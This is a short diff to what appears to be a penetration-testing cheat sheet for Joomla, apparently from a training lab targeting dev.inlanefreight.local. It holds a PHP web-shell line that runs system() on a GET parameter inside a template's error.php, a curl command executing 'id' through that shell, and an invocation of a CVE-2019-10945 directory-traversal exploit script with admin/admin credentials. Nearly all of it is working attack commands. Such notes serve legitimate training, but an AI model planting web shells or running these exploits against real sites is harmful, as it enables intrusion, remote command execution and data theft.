@@ -75,4 +75,12 @@ joomscan --url https://target.com \
 ```powershell
 system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
 
+curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
+```
+
+# Directory Traversal
+```powershell
+https://github.com/dpgg101/CVE-2019-10945
+
+python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /
 ```
